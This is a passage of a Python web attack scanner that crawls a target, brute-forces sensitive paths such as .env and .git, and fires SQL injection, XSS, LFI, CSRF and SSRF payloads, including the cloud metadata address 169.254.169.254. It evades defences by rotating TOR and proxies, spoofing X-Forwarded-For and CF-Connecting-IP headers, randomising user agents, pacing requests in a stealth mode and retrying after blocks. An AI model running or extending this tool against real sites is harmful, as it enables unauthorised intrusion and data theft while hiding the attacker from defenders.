            (r"cf-turnstile", "Cloudflare Turnstile"),
            (r"captcha", "Generic CAPTCHA"),
        ]
        for pat, desc in patterns:
            if re.search(pat, html_text, re.IGNORECASE):
                return {"found": True, "type": desc}
        return {"found": False, "type": None}

    # ------------ Active tests ------------

    def _active_tests(self, form, token_info):
        tests = []
        action = form.get("action") or form.get("url")
        method = form.get("method", "post").lower()
        inputs = form.get("inputs", [])

        if not action:
            return tests

        # Helper untuk build data form
        def build_data(include_tokens=True, invalid_token=False):
            data = {}
            for inp in inputs:
                name = inp.get("name")
                if not name:
                    continue
                lname = name.lower()

                is_token_field = any(k in lname for k in ["csrf", "token", "xsrf", "authenticity", "nonce"])

                if is_token_field:
                    if not include_tokens:
                        continue
                    if invalid_token:
                        data[name] = "INVALID_CSRF_TOKEN_12345"
                    else:
                        # pakai value asli atau dummy
                        data[name] = inp.get("value") or "VALID_CSRF_TEST"
                else:
                    data[name] = inp.get("value") or "test"
            return data

        headers_base = self.scanner.rotate_headers_Hafourenai()

        # Baseline (with tokens if ada)
        baseline = {
            "name": "baseline",
            "success": False,
            "status": None,
        }
        try:
            data = build_data(include_tokens=True, invalid_token=False)
            if method == "post":
                resp = self.scanner.safe_request("post", action, data=data, headers=headers_base, timeout=15)
            else:
                resp = self.scanner.safe_request("get", action, params=data, headers=headers_base, timeout=15)
            if resp:
                baseline["success"] = resp.status_code in (200, 302)
                baseline["status"] = resp.status_code
                baseline["len"] = len(resp.text)
                baseline["body_snippet"] = resp.text[:400].lower()
        except Exception as e:
            baseline["error"] = str(e)
        tests.append(baseline)

        # Helper untuk bandingkan dengan baseline
        def looks_accepted(reference, response):
            if not reference or not response:
                return False
            if response.status_code not in (200, 302):
                return False
            # panjang response mirip
            ref_len = reference.get("len") or 0
            diff = abs(len(response.text) - ref_len)
            if ref_len and diff / ref_len > 0.3:
                return False
            # indikator sukses sederhana
            success_words = ["success", "berhasil", "thank", "updated", "saved"]
            body = response.text.lower()
            return any(w in body for w in success_words)

        # 1) No‑token submission
        t1 = {
            "name": "no_token",
            "success": False,
            "status": None,
        }
        try:
            data = build_data(include_tokens=False)
            if method == "post":
                resp = self.scanner.safe_request("post", action, data=data, headers=headers_base, timeout=15)
            else:
                resp = self.scanner.safe_request("get", action, params=data, headers=headers_base, timeout=15)
            if resp:
                t1["status"] = resp.status_code
                t1["success"] = looks_accepted(baseline, resp)
        except Exception as e:
            t1["error"] = str(e)
        tests.append(t1)

        # 2) Invalid token submission
        if token_info["found"]:
            t2 = {
                "name": "invalid_token",
                "success": False,
                "status": None,
            }
            try:
                data = build_data(include_tokens=True, invalid_token=True)
                if method == "post":
                    resp = self.scanner.safe_request("post", action, data=data, headers=headers_base, timeout=15)
                else:
                    resp = self.scanner.safe_request("get", action, params=data, headers=headers_base, timeout=15)
                if resp:
                    t2["status"] = resp.status_code
                    t2["success"] = looks_accepted(baseline, resp)
            except Exception as e:
                t2["error"] = str(e)
            tests.append(t2)

        # 3) Cross‑origin simulation
        t3 = {
            "name": "cross_origin",
            "success": False,
            "status": None,
        }
        try:
            data = build_data(include_tokens=False)
            headers = dict(headers_base)
            headers.update({
                "Origin": "https://attacker.example",
                "Referer": "https://attacker.example/csrf.html",
            })
            if method == "post":
                resp = self.scanner.safe_request("post", action, data=data, headers=headers, timeout=15)
            else:
                resp = self.scanner.safe_request("get", action, params=data, headers=headers, timeout=15)
            if resp:
                t3["status"] = resp.status_code
                t3["success"] = looks_accepted(baseline, resp)
        except Exception as e:
            t3["error"] = str(e)
        tests.append(t3)

        return tests

class VulnScanner:
    def __init__(self, target_url, max_threads=15, crawl_depth=5, stealth_mode=False, 
                 aggressive_mode=False, proxy_file=None, use_tor=False, rate_limit=1.0):
        self.target_url = target_url
        self.max_threads = max_threads
        self.crawl_depth = crawl_depth
        self.stealth_mode = stealth_mode
        self.aggressive_mode = aggressive_mode
        
        # Debug info
        print("\n" + "="*60)
        print("VULN SCANNER INITIALIZATION")
        print("="*60)
        print(f"Target: {target_url}")
        print(f"Proxy file: {proxy_file}")
        print(f"Use TOR: {use_tor}")
        print(f"Rate limit: {rate_limit}")
        
        # Anti-ban components
        self.proxy_rotator = ProxyRotator()
        if proxy_file:
            self.proxy_rotator.load_proxies(proxy_file)
            print(f"[PROXY] Loaded {len(self.proxy_rotator.proxies)} proxies")
            if len(self.proxy_rotator.proxies) > 0:
                print(f"[PROXY] First proxy: {self.proxy_rotator.proxies[0]}")
        
        self.tor_manager = TorManager() if use_tor else None
        self.rate_limiter = RateLimiter(requests_per_second=rate_limit)
        self.block_detector = BlockDetector()
        self.use_proxies = bool(proxy_file) or use_tor
        
        print(f"[PROXY] Use proxies flag: {self.use_proxies}")
        
        self.session = requests.Session()
        
        # Setup proxies dengan cara yang lebih agresif
        if self.use_proxies:
            print("[PROXY] Setting up proxy configuration...")
            proxy_configured = False
            
            # Priority 1: TOR
            if use_tor and self.tor_manager:
                print("[PROXY] Checking TOR...")
                if self.tor_manager.tor_available:
                    tor_proxy = self.tor_manager.get_tor_proxy()
                    self.session.proxies = tor_proxy  # Replace, not update
                    proxy_configured = True
                    print(f"[PROXY] ✓ TOR proxy configured: {tor_proxy}")
                else:
                    print("[PROXY] ✗ TOR not available")
            
            # Priority 2: HTTP proxies
            if not proxy_configured and proxy_file and self.proxy_rotator.proxies:
                print("[PROXY] Setting up HTTP proxies...")
                proxy_dict = self.proxy_rotator.get_proxy()
                if proxy_dict:
                    self.session.proxies = proxy_dict  # Replace, not update
                    proxy_configured = True
                    print(f"[PROXY] ✓ HTTP proxy configured: {proxy_dict}")
                else:
                    print("[PROXY] ✗ No proxy returned from rotator")
            
            if not proxy_configured:
                print("[PROXY] ⚠️  Proxy requested but not configured, using direct connection")
            else:
                print(f"[PROXY] Final proxy config: {self.session.proxies}")
        else:
            print("[PROXY] No proxy configuration requested")
        
        # Disable SSL verification
        self.session.verify = False
        requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)
        
        # Hafourenai analyzers
        self.behavioral_analyzer = BehavioralAnalyzer()
        self.context_analyzer = ContextAnalyzer()
        self.verifier = AutomatedVerifier(self.session)
        self.csrf_detector = CSRFDetector(self)
        
        # Hafourenai evasion techniques
        self.ua = UserAgent()
        self.current_user_agent = self.ua.random
        
        # SSL context untuk Hafourenai testing
        self.ssl_context = ssl.create_default_context()
        self.ssl_context.check_hostname = False
        self.ssl_context.verify_mode = ssl.CERT_NONE
        
        # Comprehensive payload databases
        self.init_payloads()
        self.init_Hafourenai_patterns()
        
        # Discovery engines
        self.common_paths = self.load_common_paths()
        self.sitemap_paths = self.load_sitemap_paths()
        self.api_endpoints = self.load_api_endpoints()
        
        self.visited_urls = set()
        self.discovered_urls = set()
        self.vulnerabilities = []
        self.forms = []
        self.tech_stack = {}
        self.disallowed_paths = set()
        
        # Rate limiting dengan AI-style patterns
        if self.stealth_mode:
            self.request_delay = random.uniform(2, 5)
        elif self.aggressive_mode:
            self.request_delay = 0.01
        else:
            self.request_delay = 0.1
            
        self.last_request_time = 0
        self.request_count = 0
        
        print("[PROXY] Scanner initialization complete")
        print("="*60 + "\n")
    
    def safe_request(self, method='get', url=None, **kwargs):
        """Safe request dengan anti-ban protection"""
        self.rate_limiter.wait()
        
        max_retries = 3
        for attempt in range(max_retries):
            try:
                # Rotate proxy if needed
                if self.use_proxies and attempt > 0:
                    print(f"[REQUEST] Retry {attempt+1} with proxy rotation...")
                    if self.tor_manager and self.tor_manager.tor_available:
                        new_proxy = self.tor_manager.get_tor_proxy()
                        self.session.proxies = new_proxy
                        print(f"[REQUEST] Rotated to TOR proxy")
                    elif self.proxy_rotator.proxies:
                        new_proxy = self.proxy_rotator.get_proxy()
                        self.session.proxies = new_proxy
                        print(f"[REQUEST] Rotated to new HTTP proxy")
                
                # Debug info
                if self.use_proxies:
                    print(f"[REQUEST] Attempt {attempt+1}: Using proxies: {self.session.proxies}")
                
                # Make request
                if method == 'get':
                    response = self.session.get(url, **kwargs)
                elif method == 'post':
                    response = self.session.post(url, **kwargs)
                elif method == 'head':
                    response = self.session.head(url, **kwargs)
                else:
                    response = self.session.get(url, **kwargs)
                
                # Check if blocked
                is_blocked, reason = self.block_detector.is_blocked(response=response)
                
                if is_blocked:
                    print(f"[BLOCK] Detected on attempt {attempt + 1}: {reason}")
                    if attempt < max_retries - 1:
                        self.rate_limiter.on_block_detected()
                        continue
                    return None
                
                self.rate_limiter.on_success()
                print(f"[REQUEST] ✓ Success (Status: {response.status_code})")
                return response
                
            except Exception as e:
                is_blocked, reason = self.block_detector.is_blocked(exception=e)
                
                if is_blocked and attempt < max_retries - 1:
                    print(f"[ERROR] Request failed on attempt {attempt + 1}: {reason}")
                    self.rate_limiter.on_block_detected()
                    continue
                
                print(f"[ERROR] Request failed: {type(e).__name__}: {str(e)[:100]}...")
                return None
        
        return None
    
    def load_common_paths(self):
        """Load comprehensive common paths database"""
        return [
            '/admin', '/login', '/dashboard', '/user', '/api', '/console',
            '/config', '/backup', '/test', '/debug', '/phpinfo.php',
            '/wp-admin', '/administrator', '/cpanel', '/webmail', '/plesk',
            '/_admin', '/_phpmyadmin', '/myadmin', '/sqladmin',
            '/uploads', '/images', '/css', '/js', '/includes', '/assets',
            '/static', '/media', '/files', '/downloads', '/temp', '/tmp',
            '/cache', '/logs', '/backups', '/old', '/new',
            '/.git', '/.env', '/.htaccess', '/.htpasswd', '/backup.zip',
            '/database.sql', '/dump.sql', '/config.php', '/settings.py',
            '/wp-config.php', '/configuration.php', '/web.config',
            '/robots.txt', '/sitemap.xml', '/crossdomain.xml',
            '/api/v1', '/api/v2', '/api/v3', '/graphql', '/rest/api',
            '/oauth', '/auth', '/token', '/webhook', '/webhooks',
            '/json', '/xml', '/soap', '/rpc',
            '/wp-content', '/wp-includes', '/wp-json', '/joomla',
            '/drupal', '/magento', '/wordpress', '/phpBB',
            '/_debug', '/_console', '/_testing', '/_staging',
            '/phpmyadmin', '/adminer', '/phppgadmin', '/webmin'
        ]
    
    def load_sitemap_paths(self):
        """Load sitemap discovery paths"""
        return [
            '/sitemap.xml', '/sitemap_index.xml', '/sitemap.php',
            '/sitemap.txt', '/sitemap.xml.gz', '/sitemap/',
            '/sitemap1.xml', '/sitemap2.xml', '/sitemap-index.xml',
            '/sitemap_news.xml', '/sitemap_video.xml', '/sitemap_image.xml'
        ]
    
    def load_api_endpoints(self):
        """Load API endpoint patterns"""
        return [
            '/api/users', '/api/auth', '/api/login', '/api/register',
            '/api/admin', '/api/config', '/api/settings', '/api/debug',
            '/api/v1/users', '/api/v1/auth', '/api/v2/users',
            '/graphql', '/graphiql', '/playground',
            '/rest/v1', '/rest/v2', '/soap/api'
        ]
    
    def init_payloads(self):
        """Load payload database dari folder Payloads/ yang disediakan user."""
        base_dir = os.path.dirname(os.path.abspath(__file__))

        def load_payload_file(relative_path):
            path = os.path.join(base_dir, relative_path)
            payloads = []
            try:
                with open(path, "r", encoding="utf-8", errors="ignore") as f:
                    for line in f:
                        line = line.strip()
                        if not line or line.startswith("#"):
                            continue
                        payloads.append(line)
            except FileNotFoundError:
                logging.warning(f"Payload file not found: {path}")
            except Exception as e:
                logging.warning(f"Failed to load payload file {path}: {e}")
            return payloads

        # === SQLi payloads ===
        self.sqli_payloads = {
            "boolean_based": load_payload_file(r"Payloads\SQLI\Boolean_Based_SQLi_Payloads.txt"),
            "error_based": load_payload_file(r"Payloads\SQLI\Error_Based_SQLi_Payloads.txt"),
            "union_based": load_payload_file(r"Payloads\SQLI\Union_Based_SQLi_Payloads.txt"),
            "time_based": (
                load_payload_file(r"Payloads\SQLI\Time_Based_SQLi_Payloads.txt")
                + load_payload_file(r"Payloads\Time-Based SQLi\Generic Time Based SQL Injection Payloads.txt")
            ),
            "comment_based": load_payload_file(r"Payloads\SQLI\Comment_Based_SQLi_Payloads.txt"),
            "dns_exfiltration": load_payload_file(r"Payloads\SQLI\DNS_Exfiltration_SQLi_Payloads.txt"),
            "hybrid": load_payload_file(r"Payloads\SQLI\Hybrid_SQLi_Payloads.txt"),
            "oob": load_payload_file(r"Payloads\SQLI\OOB_SQLi_Payloads.txt"),
            "second_order": load_payload_file(r"Payloads\SQLI\Second_Order_SQLi_Payloads.txt"),
            "stacked_queries": load_payload_file(r"Payloads\SQLI\Stacked_Queries_SQLi_Payloads.txt"),
            "stored_procedure": load_payload_file(r"Payloads\SQLI\Stored_Procedure_SQLi_Payloads.txt"),
            "waf_bypass": load_payload_file(r"Payloads\SQLI\WAF_Bypass_SQLi_Payloads.txt"),
        }

        # filter kosong / duplikat
        for k, v in list(self.sqli_payloads.items()):
            uniq = list(dict.fromkeys(v))  # preserve order
            if not uniq:
                # jangan buang key utama yang sudah dipakai di kode
                if k in ("boolean_based", "error_based", "union_based", "time_based"):
                    self.sqli_payloads[k] = []
                else:
                    self.sqli_payloads.pop(k, None)
            else:
                self.sqli_payloads[k] = uniq

        # === XSS payloads === (satu file besar)
        xss_list = load_payload_file(r"Payloads\XSS\payload.txt")
        self.xss_payloads = {
            "basic": xss_list[:200],  # batasi sedikit untuk menghindari terlalu agresif
        }

        # === LFI payloads ===
        self.lfi_payloads = load_payload_file(r"Payloads\LFI\JHADDIX_LFI.txt")[:200]
        
        self.ssrf_payloads = [
            "http://localhost:22",
            "http://127.0.0.1:3306",
            "http://169.254.169.254/latest/meta-data/",
            "http://internal.api.local/secret",
            "http://[::1]:22",
            "http://0.0.0.0:80",
            "http://localhost/admin",
        ]

    def init_Hafourenai_patterns(self):
        """Hafourenai pattern matching """
        self.sensitive_patterns = [
            (r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b', 'Email addresses'),
            (r'\b(?:[0-9]{1,3}\.){3}[0-9]{1,3}\b', 'IP addresses'),
            (r'\b(?:4[0-9]{12}(?:[0-9]{3})?|5[1-5][0-9]{14})\b', 'Credit card numbers'),
            (r'\b[A-Za-z0-9+/]{40,}\b', 'API keys/Base64 data'),
            (r'password\s*[=:]\s*[^\s]+', 'Password in plaintext'),
            (r'api[_-]?key\s*[=:]\s*[^\s]+', 'API keys'),
            (r'secret[_-]?key\s*[=:]\s*[^\s]+', 'Secret keys'),
            (r'database[_-]?url\s*[=:]\s*[^\s]+', 'Database URLs'),
            (r'aws[_-]?access[_-]?key\s*[=:]\s*[^\s]+', 'AWS Access Keys'),
            (r'aws[_-]?secret[_-]?key\s*[=:]\s*[^\s]+', 'AWS Secret Keys'),
        ]
        
        self.sql_error_patterns = [
            r"mysql_fetch_array",
            r"mysqli_fetch_array",
            r"PostgreSQL.*ERROR",
            r"ORA-\d+",
            r"Microsoft OLE DB Provider",
            r"ODBC Driver",
            r"SQLServer JDBC Driver",
            r"SQLite3::execute",
            r"Unclosed quotation mark",
            r"SQL syntax.*MySQL",
            r"Warning.*mysql",
            r"PostgreSQL.*query failed",
        ]

    def rotate_headers_Hafourenai(self):
        """Hafourenai header rotation dengan behavioral patterns"""
        headers = {
            'User-Agent': self.ua.random,
            'Accept': random.choice([
                'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8'
            ]),
            'Accept-Language': random.choice(['en-US,en;q=0.5', 'en-GB,en;q=0.5', 'en;q=0.5']),
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
        }
        
        # Add random headers untuk Hafourenai evasion
        if random.random() > 0.3:
            headers['X-Forwarded-For'] = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
        if random.random() > 0.5:
            headers['X-Real-IP'] = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
        if random.random() > 0.7:
            headers['CF-Connecting-IP'] = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
            
        return headers

    def smart_delay_Hafourenai(self):
        """AI-style delay patterns untuk mimic human behavior"""
        if self.stealth_mode:
            # Human-like random delays
            delay_patterns = [
                random.uniform(1, 3),
                random.uniform(3, 7),
                random.uniform(0.5, 1.5),
            ]
            time.sleep(random.choice(delay_patterns))
        else:
            # Aggressive mode - minimal delay
            elapsed = time.time() - self.last_request_time
            if elapsed < self.request_delay:
                time.sleep(self.request_delay - elapsed)
            self.last_request_time = time.time()

    def is_same_domain(self, url):
        """FIXED DOMAIN VALIDATION - Less strict"""
        try:
            target_domain = urlparse(self.target_url).netloc
            url_domain = urlparse(url).netloc
            
            # Handle relative URLs
            if not url_domain:
                return True
                
            # Handle subdomains and same domain
            return url_domain == target_domain or url_domain.endswith('.' + target_domain)
        except Exception as e:
            logging.debug(f"Domain validation error: {e}")
            return True

    def is_static_file(self, url):
        """LESS AGGRESSIVE static file filtering"""
        static_extensions = ['.jpg', '.jpeg', '.png', '.gif', '.ico', '.svg', '.woff', '.ttf']
        
        url_lower = url.lower()
        
        # Only filter real static files, bukan URLs dengan parameters
        if '?' in url_lower:
            return False
            
        return any(url_lower.endswith(ext) for ext in static_extensions)

    def crawl(self, url=None, depth=0):
        """FIXED CRAWLING - Better URL discovery"""
        if depth > self.crawl_depth:
            return
            
        current_url = url or self.target_url
        
        if current_url in self.visited_urls:
            return
            
        try:
            self.smart_delay_Hafourenai()
            logging.info(f"Crawling: {current_url} (Depth: {depth})")
            
            response = self.safe_request('get', current_url, headers=self.rotate_headers_Hafourenai(), timeout=15)
            if not response:
                return
                
            self.visited_urls.add(current_url)
            
            # Comprehensive analysis
            self.analyze_tech_stack(response)
            self.Hafourenai_header_analysis(response.headers, current_url)
            self.content_analysis_Hafourenai(response.text, current_url)
            self.extract_forms(response.text, current_url)
            
            # Multi-method URL discovery
            discovered_urls = set()
            
            # 1. Traditional HTML parsing
            discovered_urls.update(self.traditional_crawl_Hafourenai(response.text, current_url))
            
            # 2. JavaScript analysis
            discovered_urls.update(self.javascript_url_extraction(response.text, current_url))
            
            # 3. Common paths (only at depth 0)
            if depth == 0:
                discovered_urls.update(self.common_paths_bruteforce_Hafourenai(current_url))
                discovered_urls.update(self.parse_sitemap_Hafourenai(current_url))
                discovered_urls.update(self.api_endpoints_discovery(current_url))
            
            logging.info(f"Found {len(discovered_urls)} URLs from {current_url}")
            
            # Process discovered URLs
            for discovered_url in discovered_urls:
                if (self.is_same_domain(discovered_url) and 
                    discovered_url not in self.visited_urls and
                    not self.is_static_file(discovered_url)):
                    
                    self.discovered_urls.add(discovered_url)
                    logging.info(f"Adding to scan queue: {discovered_url}")
                    
                    # Immediate recursive crawling
                    if depth < self.crawl_depth:
                        self.crawl(discovered_url, depth + 1)
                            
        except Exception as e:
            logging.error(f"Crawling error at {current_url}: {e}")

    def traditional_crawl_Hafourenai(self, html_content, base_url):
        """Hafourenai HTML parsing dengan better URL handling"""
        urls_found = set()
        
        try:
            soup = BeautifulSoup(html_content, 'html.parser')
            
            # Comprehensive tag coverage
            tags_to_check = [
                ('a', 'href'), ('link', 'href'), ('script', 'src'),
                ('img', 'src'), ('iframe', 'src'), ('form', 'action'),
                ('meta', 'content'), ('area', 'href'), ('base', 'href'),
                ('embed', 'src'), ('source', 'src'), ('track', 'src'),
            ]
            
            for tag_name, attr_name in tags_to_check:
                for element in soup.find_all(tag_name, attrs={attr_name: True}):
                    href = element.get(attr_name)
                    if href and href.strip() and not href.startswith(('javascript:', 'mailto:', 'tel:')):
                        full_url = urljoin(base_url, href.strip())
                        
                        # Clean URL - remove fragments
                        full_url = full_url.split('#')[0]
                        
                        urls_found.add(full_url)
            
            # Juga cari URLs di text content
            url_pattern = r'https?://[^\s<>"\'{}|\\^`]+|/[^\s<>"\'{}|\\^`]*\.(?:php|html|aspx|jsp)[^\s<>"\'{}|\\^`]*'
            text_urls = re.findall(url_pattern, html_content)
            for found_url in text_urls:
                full_url = urljoin(base_url, found_url)
                full_url = full_url.split('#')[0]
                urls_found.add(full_url)
                
        except Exception as e:
            logging.error(f"HTML parsing error: {e}")
            
        return urls_found

    def javascript_url_extraction(self, html_content, base_url):
        """Hafourenai JavaScript URL extraction"""
        urls_found = set()
        
        # Comprehensive JS patterns
        patterns = [
            r'[\'"](/[^\'"]*?\.(?:php|html|aspx|jsp)[^\'"]*?)[\'"]',
            r'[\'"](https?://[^\'"]*?)[\'"]',
            r'url\([\'"]([^\'"]*?)[\'"]\)',
            r'\.load\([\'"]([^\'"]*?)[\'"]\)',
            r'fetch\([\'"]([^\'"]*?)[\'"]\)',
            r'ajax\([^)]*?url:\s*[\'"]([^\'"]*?)[\'"]',
            r'window\.location\s*=\s*[\'"]([^\'"]*?)[\'"]',
            r'\.href\s*=\s*[\'"]([^\'"]*?)[\'"]',
            r'\.src\s*=\s*[\'"]([^\'"]*?)[\'"]',
            r'\.open\([^,]+,\s*[\'"]([^\'"]*?)[\'"]',
        ]
        
        for pattern in patterns:
            matches = re.findall(pattern, html_content, re.IGNORECASE)
            for match in matches:
                if match.startswith(('http://', 'https://', '//')):
                    full_url = match if match.startswith('http') else 'https:' + match
                else:
                    full_url = urljoin(base_url, match)
                urls_found.add(full_url)
                
        return urls_found

    def common_paths_bruteforce_Hafourenai(self, base_url):
        """Hafourenai common paths discovery"""
        urls_found = set()
        
        for path in self.common_paths:
            test_url = urljoin(base_url, path)
            
            # Skip disallowed paths
            if any(disallowed in test_url for disallowed in self.disallowed_paths):
                continue
                
            try:
                response = self.safe_request('head', test_url, headers=self.rotate_headers_Hafourenai(), timeout=5)
                if not response:
                    continue
                
                if response.status_code not in [404, 403, 401]:
                    urls_found.add(test_url)
                    logging.info(f"Found: {test_url} (Status: {response.status_code})")
                    
                    # Jika directory, cari index files
                    if response.status_code in [200, 301, 302] and not test_url.endswith(('.php', '.html')):
                        index_files = ['index.php', 'index.html', 'default.aspx', 'main.jsp', 'admin.php']
                        for index_file in index_files:
                            index_url = urljoin(test_url + '/', index_file)
                            try:
                                resp = self.safe_request('head', index_url, headers=self.rotate_headers_Hafourenai(), timeout=3)
                                if resp and resp.status_code == 200:
                                    urls_found.add(index_url)
                            except:
                                pass
                                
            except Exception as e:
                logging.debug(f"Path discovery failed: {e}")
                
        return urls_found

    def parse_sitemap_Hafourenai(self, base_url):
        """Hafourenai sitemap parsing"""
        urls_found = set()
        
        for sitemap_path in self.sitemap_paths:
            sitemap_url = urljoin(base_url, sitemap_path)
            try:
                response = self.safe_request('get', sitemap_url, headers=self.rotate_headers_Hafourenai(), timeout=10)
                if not response or response.status_code != 200:
                    continue
                    
                # XML sitemap
                if '<?xml' in response.text:
                    try:
                        root = ET.fromstring(response.text)
                        namespace = {'ns': 'http://www.sitemaps.org/schemas/sitemap/0.9'}
                        
                        # Sitemap index
                        for sitemap in root.findall('.//ns:sitemap', namespace):
                            loc = sitemap.find('ns:loc', namespace)
                            if loc is not None and loc.text:
                                urls_found.add(loc.text)
                        
                        # URL entries
                        for url in root.findall('.//ns:url', namespace):
                            loc = url.find('ns:loc', namespace)
                            if loc is not None and loc.text:
                                urls_found.add(loc.text)
                                
                    except ET.ParseError:
                        # Plain text sitemap
                        for line in response.text.split('\n'):
                            line = line.strip()
                            if line and (line.startswith('http') or line.startswith('/')):
                                full_url = urljoin(base_url, line)
                                urls_found.add(full_url)
                
                logging.info(f"Found {len(urls_found)} URLs in sitemap: {sitemap_url}")
                
            except Exception as e:
                logging.debug(f"Sitemap parsing failed: {e}")
                
        return urls_found

    def api_endpoints_discovery(self, base_url):
        """API endpoints discovery"""
        urls_found = set()
        
        for endpoint in self.api_endpoints:
            test_url = urljoin(base_url, endpoint)
            try:
                response = self.safe_request('head', test_url, headers=self.rotate_headers_Hafourenai(), timeout=5)
                if response and response.status_code not in [404, 403]:
                    urls_found.add(test_url)
                    logging.info(f"Found API: {test_url}")
            except:
                pass
                
        return urls_found

    def analyze_tech_stack(self, response):
        """Hafourenai technology stack detection"""
        headers = response.headers
        body = response.text
        
        # Web server detection
        server = headers.get('Server', '')
        if 'Apache' in server:
            self.tech_stack['web_server'] = 'Apache'
        elif 'nginx' in server:
            self.tech_stack['web_server'] = 'Nginx'
        elif 'IIS' in server:
            self.tech_stack['web_server'] = 'IIS'
            
        # Framework detection
        if any(indicator in body for indicator in ['wp-content', 'wordpress']):
            self.tech_stack['framework'] = 'WordPress'
        elif 'laravel' in body.lower():
            self.tech_stack['framework'] = 'Laravel'
        elif 'django' in body.lower():
            self.tech_stack['framework'] = 'Django'
        elif any(indicator in body for indicator in ['react', 'vue', 'angular']):
            self.tech_stack['framework'] = 'JavaScript Framework'
            
        # Programming language
        if '.php' in response.url or '?php' in body:
            self.tech_stack['language'] = 'PHP'
        elif '.aspx' in response.url or '__VIEWSTATE' in body:
            self.tech_stack['language'] = 'ASP.NET'
        elif '.jsp' in response.url:
            self.tech_stack['language'] = 'Java'
            
        logging.info(f"Tech Stack: {self.tech_stack}")

    def extract_forms(self, html_content, url):
        """Form extraction"""
        soup = BeautifulSoup(html_content, 'html.parser')
        
        for form in soup.find_all('form'):
            form_info = {
                'action': urljoin(url, form.get('action', '')),
                'method': form.get('method', 'get').lower(),
                'inputs': [],
                'url': url
            }
            
            # Input fields
            for input_tag in form.find_all('input'):
                input_info = {
                    'name': input_tag.get('name', ''),
                    'type': input_tag.get('type', 'text'),
                    'value': input_tag.get('value', '')
                }
                form_info['inputs'].append(input_info)
                
            # Textareas
            for textarea in form.find_all('textarea'):
                input_info = {
                    'name': textarea.get('name', ''),
                    'type': 'textarea',
                    'value': textarea.get('value', '')
                }
                form_info['inputs'].append(input_info)
                
            # Select fields
            for select in form.find_all('select'):
                input_info = {
                    'name': select.get('name', ''),
                    'type': 'select',
                    'value': ''
                }
                form_info['inputs'].append(input_info)
                
            self.forms.append(form_info)

    # === Hafourenai VULNERABILITY TESTING  ===

    def test_sql_injection_Hafourenai(self):
        """Hafourenai SQL Injection testing"""
        logging.info("Testing SQL Injection with behavioral analysis...")
        
        tested_pairs = set()
        
        # URL Parameter Testing with Verification
        for url in list(self.visited_urls):
            parsed = urlparse(url)
            if parsed.query:
                params = urllib.parse.parse_qs(parsed.query)
                
                # Establish baseline
                baseline = self.behavioral_analyzer.establish_baseline(
                    f"{parsed.scheme}://{parsed.netloc}{parsed.path}", 
                    {k: v[0] for k, v in params.items()}
                )
                
                for param_name, param_values in params.items():
                    for technique, payloads in self.sqli_payloads.items():
                        for payload in payloads[:3]:
                            test_pair = f"{url}_{param_name}_{payload}"
                            if test_pair in tested_pairs:
                                continue
                            tested_pairs.add(test_pair)
                            
                            try:
                                # Create test URL
                                test_params = {k: v[0] for k, v in params.items()}
                                test_params[param_name] = payload
                                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
                                
                                response = self.safe_request('get', test_url,
                                    params=test_params,
                                    headers=self.rotate_headers_Hafourenai(),
                                    timeout=10
                                )
                                if not response:
                                    continue
                                
                                # Differential analysis
                                diff_analysis = self.behavioral_analyzer.analyze_differential(baseline, response)
                                
                                # Context-aware SQL detection
                                context_analysis = self.context_analyzer.analyze_sql_context(response.text, payload)
                                
                                # Automated verification
                                verification = self.verifier.verify_sqli_with_multiple_techniques(
                                    test_url, param_name, test_params
                                )
                                
                                # Combined confidence scoring
                                combined_confidence = (
                                    diff_analysis['confidence'] * 0.3 +
                                    context_analysis['confidence'] * 0.4 +
                                    verification['confidence'] * 0.3
                                )
                                
                                # Report only if high confidence
                                if combined_confidence > 0.7 and verification['vulnerable']:
                                    self.report_vulnerability(
                                        vuln_type=f"SQL Injection - {technique.replace('_', ' ').title()}",
                                        level="High",
                                        url=test_url + '?' + urllib.parse.urlencode(test_params),
                                        parameter=param_name,
                                        proof=f"Verified with {verification['techniques_confirmed']} techniques. Confidence: {combined_confidence:.2%}",
                                        recommendation="Use parameterized queries and input validation",
                                        confidence=combined_confidence
                                    )
                                    
                                # Time-based verification
                                if technique == 'time_based':
                                    time_verification = self.behavioral_analyzer.verify_time_based_vulnerability(
                                        test_url, test_params, param_name, self.session
                                    )
                                    
                                    if time_verification['vulnerable'] and time_verification['confidence'] > 0.7:
                                        self.report_vulnerability(
                                            vuln_type="SQL Injection - Time Based (Verified)",
                                            level="High",
                                            url=test_url + '?' + urllib.parse.urlencode(test_params),
                                            parameter=param_name,
                                            proof=f"Time-based SQLi verified: {time_verification['evidence']}",
                                            recommendation="Implement input validation and use prepared statements",
                                            confidence=time_verification['confidence']
                                        )
                                        
                            except Exception as e:
                                logging.debug(f"SQLi URL test failed: {e}")

        # Form-based SQL Injection with Verification
        for form in self.forms:
            for input_field in form['inputs']:
                if input_field['name'] and input_field['type'] in ['text', 'password', 'search', 'email', 'number']:
                    for technique, payloads in self.sqli_payloads.items():
                        for payload in payloads[:2]:
                            try:
                                data = {}
                                for field in form['inputs']:
                                    if field['name']:
                                        if field['name'] == input_field['name']:
                                            data[field['name']] = payload
                                        else:
                                            data[field['name']] = field['value'] or 'test'
                                
                                self.smart_delay_Hafourenai()
                                
                                if form['method'] == 'post':
                                    response = self.safe_request('post', form['action'],
                                        data=data,
                                        headers=self.rotate_headers_Hafourenai(),
                                        timeout=10
                                    )
                                else:
                                    response = self.safe_request('get', form['action'],
                                        params=data,
                                        headers=self.rotate_headers_Hafourenai(),
                                        timeout=10
                                    )
                                
                                if not response:
                                    continue
                                
                                # Context analysis
                                context_analysis = self.context_analyzer.analyze_sql_context(response.text, payload)
                                
                                # Automated verification for forms
                                if form['method'] == 'get':
                                    verification = self.verifier.verify_sqli_with_multiple_techniques(
                                        form['action'], input_field['name'], data
                                    )
                                    
                                    combined_confidence = (
